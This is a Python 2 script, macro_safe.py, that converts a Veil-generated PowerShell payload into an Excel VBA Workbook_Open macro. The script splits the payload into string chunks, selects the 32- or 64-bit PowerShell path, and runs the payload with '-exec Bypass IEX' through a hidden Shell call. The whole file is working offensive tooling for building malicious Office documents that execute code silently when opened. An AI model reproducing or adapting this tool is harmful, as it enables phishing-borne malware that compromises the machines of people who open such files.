#!/usr/bin/python

#####
# macro_safe.py
#####
#
# Takes Veil powershell batch file and outputs into a text document 
# macro safe text for straight copy/paste.
#

import os, sys
import re

def formStr(varstr, instr):
 holder = []
 str1 = ''
 str2 = ''
 str1 = varstr + ' = "' + instr[:54] + '"' 
 for i in xrange(54, len(instr), 48):
 	holder.append(varstr + ' = '+ varstr +' + "'+instr[i:i+48])
 	str2 = '"\r\n'.join(holder)
 
 str2 = str2 + "\""
 str1 = str1 + "\r\n"+str2
 return str1

if len(sys.argv) < 2:
 print "----------------------\n"
 print " Macro Safe\n"
 print "----------------------\n"
 print "\n"
 print "Takes Veil batch output and turns into macro safe text\n"
 print "\n"
 print "USAGE: " + sys.argv[0] + " <input batch> <output text>\n"
 print "\n"
else:

 fname = sys.argv[1]
 
 f = open(fname)
 lines = f.readlines()
 f.close()
 cut = []

 for line in lines:
 	if "@echo off" not in line:
 		first = line.split('else')
 		#split on else to truncate the back half
 
 		# split on \" 
 		cut = first[0].split('\\"', 4)
 
 		#get rid of everything before powershell
 		cut[0] = cut[0].split('%==x86')[1] 
 		cut[0] = cut[0][2:] 

 		#get rid of trailing parenthesis
 		cut[2] = cut[2].strip(" ")
 		cut[2] = cut[2][:-1]

 # for i in range(0,3):
 # print str(i) + " " +cut[i]
 
 top = "Sub Workbook_Open()\r\n"
 top = top + "Dim str As String\r\n"
 top = top + "Dim exec As String\r\n"
 
 #insert '\r\n' and 'str = str +' every 48 chars after the first 54.
 payL = formStr("str", str(cut[1]))
 
 #double up double quotes, add the rest of the exec string 
 idx = cut[0].index('"')	#tells us where IEX is. Now we also have to subtract 10 to remove -Command  
 arch_det=" $arch=$ENV:Processor_architecture;$windir1=Get-ChildItem Env:windir;"
 
 #next our stub for the payload 
 #cut[0] = cut[0] + "\\\"\" \" & str & \" \\\"\" " + cut[2] +"\""	#deprecated
 idx2 = cut[0].index('$')
 run1 = "$run="+cut[0][idx2:]+ "\\\"\" \" & str & \" \\\"\" " + cut[2][:len(cut[2])-1]
 
 #this is our new Invoke-Expression command.  I'm probably making this overly complicated, but it works...
 iex1="$iex1 = Invoke-Expression $run;"
 
 #our 32 or 64 bit if statement. You could make $powerComm default to "powershell.exe" and drop the else, but left in for visibility
 if_state="if($arch.Contains(\\\"\"64\\\"\")){$powerComm=$windir1.Value.ToString()"
 if_state= if_state + " +\\\"\"\\\\SysWOW64\\\\windowspowershell\\\\v1.0\\\\powershell.exe\\\"\";}else{$powerComm=\\\"\"powershell.exe\\\"\";};"
 
 #the actual magic
 magic="&$powerComm -exec Bypass IEX $($iex1)"
 
 #put it all together, and hope/wish/pray it works
 #cut[0] = cut[0][:idx] + '"' + cut[0][idx:]	#deprecated
 cut[0] = cut[0][:idx-10] + arch_det + run1 + iex1 +if_state + magic
 
 #insert 'exec = exec +' and '\r\n' every 48 after the first 54.
 execStr = formStr("exec", str(cut[0]))

 shell = "Shell exec,vbHide"
 bottom = "End Sub\r\n\r\n\'---Generated by macro_safe.py by khr040sh---"
 
 final = ''
 final = top + "\r\n" + payL + "\r\n\r\n" + execStr + "\r\n\r\n" + shell + "\r\n\r\n" + bottom + "\r\n"

 print final

 try:
 	f = open(sys.argv[2],'w')
 	f.write(final) # python will convert \n to os.linesep
 	f.close()
 except:
 	print "Error writing file.\n Please check permissions and try again.\nExiting..."
 	sys.exit(1)
 
 print "File written to " + sys.argv[2] + " !"